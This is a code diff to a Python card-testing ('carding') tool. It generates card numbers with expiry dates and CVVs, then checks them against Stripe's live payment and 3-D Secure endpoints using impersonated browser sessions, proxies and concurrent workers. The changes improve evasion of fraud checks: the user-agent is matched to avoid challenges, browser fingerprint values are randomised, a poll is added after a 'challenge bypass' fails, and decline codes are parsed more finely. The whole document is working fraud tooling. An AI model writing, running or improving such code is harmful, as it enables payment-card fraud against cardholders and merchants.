@@ -538,7 +538,7 @@ class CardGenerator:
         else: full_card = card+'0'
         if len(full_card) != target_len: full_card = full_card.ljust(target_len,'0')
         month = parts[1].zfill(2) if len(parts)>1 and parts[1].lower()!='xx' else f"{random.randint(1,12):02d}"
-        year = parts[2].zfill(2) if len(parts)>2 and parts[2].lower()!='xx' else f"{datetime.now().year+random.randint(1,5):02d}"
+        year = parts[2][-2:] if len(parts)>2 and parts[2].lower()!='xx' else f"{(datetime.now().year+random.randint(1,5))%100:02d}"
         cvv = parts[3] if len(parts)>3 and parts[3].lower() not in ('xxx','xxxx') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
         return {'card':full_card, 'month':month, 'year':year, 'cvv':cvv}
 
@@ -964,6 +964,7 @@ class StripeAPIHitter:
         
         max_retries = 3
         for current_attempt in range(max_retries):
+            _cffi_session = None
             try:
                 # Acquire loop once per attempt — prevents broken ordering from re-acquiring mid-flow
                 loop = asyncio.get_event_loop()
@@ -1004,6 +1005,7 @@ class StripeAPIHitter:
                 
                 # Step 0: Create browser session with persistent cookie jar
                 _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
+                _cffi_session_opened = True
                 if proxies:
                     _cffi_session.proxies = proxies
 
@@ -1482,14 +1484,13 @@ class StripeAPIHitter:
                                     state = "redirected"
                                     processed_auth = True
                                 elif source:
-                                    # authenticate is an SDK-facing endpoint — use Android UA (mobile SDK path)
-                                    _auth_ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+                                    # authenticate must match the confirm UA — mismatched UA/dimensions trigger challenge
                                     auth_headers = {
                                         "accept": "application/json",
                                         "content-type": "application/x-www-form-urlencoded",
                                         "origin": "https://js.stripe.com",
                                         "referer": "https://js.stripe.com/",
-                                        "user-agent": _auth_ua
+                                        "user-agent": profile["user_agent"]
                                     }
                                     browser = {
                                         "fingerprintAttempted": True,
@@ -1499,11 +1500,11 @@ class StripeAPIHitter:
                                         "browserJavaEnabled": False,
                                         "browserJavascriptEnabled": True,
                                         "browserLanguage": "en-US",
-                                        "browserColorDepth": "24",
-                                        "browserScreenHeight": "873",
-                                        "browserScreenWidth": "393",
-                                        "browserTZ": "-300",
-                                        "browserUserAgent": auth_headers["user-agent"]
+                                        "browserColorDepth": profile.get("color_depth", "24"),
+                                        "browserScreenHeight": profile.get("screen_height", "1080"),
+                                        "browserScreenWidth": profile.get("screen_width", "1920"),
+                                        "browserTZ": str(random.randint(-480, 540)),
+                                        "browserUserAgent": profile["user_agent"]
                                     }
                                     auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                     auth_data = {
@@ -1608,6 +1609,33 @@ class StripeAPIHitter:
                                                         return result
                                             except Exception as _ch_ex:
                                                 print(f"DEBUG: Post-challenge bypass failed: {_ch_ex}")
+                                        # Final poll before giving up — bank may have auto-approved
+                                        try:
+                                            _final_poll_type = "setup_intent" if is_setup_intent else "payment_intent"
+                                            _final_poll_headers = {
+                                                "User-Agent": profile["user_agent"],
+                                                "Accept": "application/json",
+                                                "Origin": "https://js.stripe.com",
+                                                "Referer": "https://js.stripe.com/",
+                                            }
+                                            if _HAS_3DS_BYPASS:
+                                                _fp_result = await poll_intent_status(
+                                                    loop, _cffi_session, self.pk_live,
+                                                    client_secret, intent_id, _final_poll_type, _final_poll_headers
+                                                )
+                                                if _fp_result:
+                                                    _fps, _fpm = _fp_result
+                                                    if _fps in ('charged', 'approved'):
+                                                        result['success'] = True
+                                                        result['decline_code'] = _fpm
+                                                        return result
+                                                    elif _fps in ('declined', 'live_declined'):
+                                                        result['decline_code'] = _fpm
+                                                        result['error'] = _fpm
+                                                        result['raw_response'] = confirm_json
+                                                        return result
+                                        except Exception as _fp_ex:
+                                            print(f"DEBUG: Final poll failed: {_fp_ex}")
                                         result['decline_code'] = 'challenge_required'
                                         result['error'] = 'challenge_required'
                                         result['raw_response'] = confirm_json
@@ -1653,8 +1681,15 @@ class StripeAPIHitter:
                             result['raw_response'] = confirm_json
                             return result
                     elif status == 'requires_payment_method':
-                        result['decline_code'] = 'generic_decline'
-                        result['error'] = 'requires_payment_method'
+                        _rpm_obj = confirm_json.get('payment_intent') or confirm_json.get('setup_intent') or confirm_json
+                        if not isinstance(_rpm_obj, dict): _rpm_obj = confirm_json
+                        _rpm_err = _rpm_obj.get('last_payment_error') or _rpm_obj.get('last_setup_error') or {}
+                        if isinstance(_rpm_err, dict) and (_rpm_err.get('decline_code') or _rpm_err.get('code')):
+                            result['decline_code'] = _rpm_err.get('decline_code') or _rpm_err.get('code', 'generic_decline')
+                            result['error'] = _rpm_err.get('message', 'Card declined')
+                        else:
+                            result['decline_code'] = 'generic_decline'
+                            result['error'] = 'requires_payment_method'
                         result['raw_response'] = confirm_json
                     elif status == 'open':
                         err = confirm_json.get('error')
@@ -1692,6 +1727,12 @@ class StripeAPIHitter:
                 result['decline_code'] = 'exception'
                 result['response_time'] = time.time() - start
                 return result
+            finally:
+                if _cffi_session:
+                    try:
+                        _cffi_session.close()
+                    except Exception:
+                        pass
                 
         return result
 
@@ -1712,6 +1753,7 @@ class ConcurrentHitter:
         self.is_running = True
         self._reusable = any(d in self.url.lower() for d in self.REUSABLE_DOMAINS)
         self._session_lock = asyncio.Lock()  # serialize session fetches to avoid thundering herd
+        self._counter_lock = asyncio.Lock()  # protect completed/successes/fails from race conditions
         # Cached stripe device tokens — mimic __stripe_mid (1yr) and __stripe_sid (30min) persistence
         # All cards in the same session share the same muid/sid/guid, just like a real browser
         self._stripe_tokens: dict = {}
@@ -1977,11 +2019,15 @@ class ConcurrentHitter:
                 if not self.is_running and not result.get('success'):
                     return
                 
-                self.completed += 1
+                async with self._counter_lock:
+                    self.completed += 1
+                    if result['success']:
+                        self.successes += 1
+                        self.is_running = False
+                    else:
+                        self.fails += 1
+                
                 if result['success']:
-                    self.successes += 1
-                    self.is_running = False
-                    
                     # Cancel all other workers immediately to stop them
                     current_task = asyncio.current_task()
                     for w in getattr(self, 'workers', []):
@@ -1993,8 +2039,6 @@ class ConcurrentHitter:
                             queue.get_nowait()
                         except asyncio.QueueEmpty:
                             break
-                else:
-                    self.fails += 1
                     
                 if self.update_callback:
                     await self.update_callback({
@@ -2016,8 +2060,9 @@ class ConcurrentHitter:
                 if not self.is_running:
                     return
                     
-                self.completed += 1
-                self.fails += 1
+                async with self._counter_lock:
+                    self.completed += 1
+                    self.fails += 1
                 if self.update_callback:
                     err_res = {'success': False, 'card': card, 'response_time': 0, 'decline_code': 'exception', 'error': f"Internal bot crash: {str(e)}"}
                     await self.update_callback({
